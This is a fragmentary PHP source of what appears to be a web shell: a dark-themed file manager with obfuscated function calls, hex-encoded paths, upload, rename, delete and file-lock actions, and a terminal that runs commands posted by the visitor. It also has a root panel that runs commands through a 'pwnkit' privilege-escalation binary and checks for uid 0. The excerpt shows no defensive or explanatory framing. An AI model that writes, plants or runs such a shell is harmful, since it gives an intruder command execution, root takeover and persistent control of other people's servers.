...
if ($_GET['don'] == true) {
    $FilesDon = download(decrypt_hex($_GET['don']));
}
?>
<!DOCTYPE html>
<html lang="en">
...
<body class="bg-[#0a192f] p-5 flex flex-col gap-4">
    ...
    <div class="rounded-md p-6 border border-[#64ffda] flex items-center gap-10 text-[#64ffda] text-xs">
        ...
        <div class="flex gap-8 items-center">
            <a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal">
                <i class="fa-solid fa-terminal"></i> Terminal
            </a>
            <a href="?d=<?= hx($fungsi[0]()) ?>&adminer">
                        ...
                        <?php foreach ($file_manager as $_D) : ?>
                            <?php if ($fungsi[2]($_D)) : ?>
                                <tr>
                                    ...
                                    <td class="px-7 py-2"><span class="badge badge-dir">DIR</span></td>
                                    <td class="px-7 py-2 <?php echo $fungsi[4]($fungsi[0]() . '/' . $_D) ? 'perm-writable' : 'perm-readonly'; ?>">
                                        <?php echo perms($fungsi[0]() . '/' . $_D); ?>
                                    </td>
                                    <td class="px-7 py-2">
                                        <button type="submit" name="" class="text-[#70FA74] hover:text-[#53BD55] cursor-pointer transition-all">
                                            <i class="fa-solid fa-pen-to-square"></i>
                                        </button>
                                        <button class="text-[#69C5FF] hover:text-[#4C92BF] cursor-pointer transition-all">
                                            <i class="fa-solid fa-file-zip"></i>
                                        </button>
                                        <button type="submit" name="btn-delete" class="text-[#FF6161] hover:text-[#C74C4C] cursor-pointer transition-all">
                        ...
                        <?php foreach ($file_manager as $_F) : ?>
                            <?php if ($fungsi[3]($_F)) : ?>
                                <tr>
                                    ...
                                    <td class="px-7 py-2">
                                        <button class="text-[#70FA74] hover:text-[#53BD55] cursor-pointer transition-all">
                                            <i class="fa-solid fa-pen-to-square"></i>
                                        </button>
                                        <button class="text-[#69C5FF] hover:text-[#4C92BF] cursor-pointer transition-all">
                                            <i class="fa-solid fa-file-zip"></i>
    ...
    <div id="modal-popup" class="hidden fixed top-0 left-0 right-0 bottom-0 z-10 bg-white text-gray-800 rounded-lg h-fit overflow-auto w-2/6 p-7">
                ...
                <div class="terminal-body">
                    <textarea disabled><?php
                                        if (isset($_POST['terminal'])) {
                                            echo $fungsi[10](terminal_cmd($_POST['terminal-text'] . " 2>&1"));
                                        }
                                        ?></textarea>
                    <form action="" method="post">
                                        ...
                                        if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
                                            ...
                                            if ($r_text[0] == "uid=0(root)") {
                                                if (isset($_POST['submit-root'])) {
                                                    echo terminal_cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
                                                }
                                            } else {
                                                echo "This Device Is Not Vulnerable\n";
                                                echo terminal_cmd('cat /etc/os-release') . "\n";
    ...
    <?php if ($_GET['re'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fa-solid fa-pen-to-square"></i> Rename: <?= decrypt_hex($_GET['re']) ?></h3>
                </div>
                <form action="" method="post">
    ...
    <script>
        $(document).ready(function() {
            ...
            $('#lock-file').click(function(e) {
                ...
                $('#modal-input').html('<input type="text" name="lockfile" class="border border-gray-300 px-2 py-1 w-full rounded-sm" placeholder="Enter file name to lock">');
            });
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        ...
        if ($fileSize > 0 && is_uploaded_file($tmpName)) {
            ...
            if ($fungsi[29]($tmpName, $targetPath)) {
                ...
                if (file_exists($targetPath) && filesize($targetPath) > 0) {
                    $msg = "You File Success Imported !"; $msg_type = "success";
                } else {
                    @unlink($targetPath);
                    if (copy($tmpName, $targetPath)) {
                        $msg = "You File Success Imported !"; $msg_type = "success";
                    } else { $msg = "You File Failure Imported !"; $msg_type = "error"; }
                }
            } else {
                if (copy($tmpName, $targetPath)) {
                    $msg = "You File Success Imported !"; $msg_type = "success";
    ...
    if (isset($_POST['submit'])) {
        if ($_POST['create_folder'] == true) { 
            ...
            if ($folderName) { $msg = "You Folder Success Created !"; $msg_type = "success"; } else { $msg = "You Folder Failure Created !"; $msg_type = "error"; } 
            refreshPages();
        }
        if ($_POST['create_file'] == true) { 
            $namaFile = $fungsi[13]($_POST['create_file']); 
            if ($namaFile) { $msg = "You File Success Created !"; $msg_type = "success"; } else { $msg = "You File Failure Created !"; $msg_type = "error"; }
            refreshPages();
        }
        if ($_POST['create_file'] == true) { 
            $namaFile = $fungsi[13]($_POST['create_file']); 
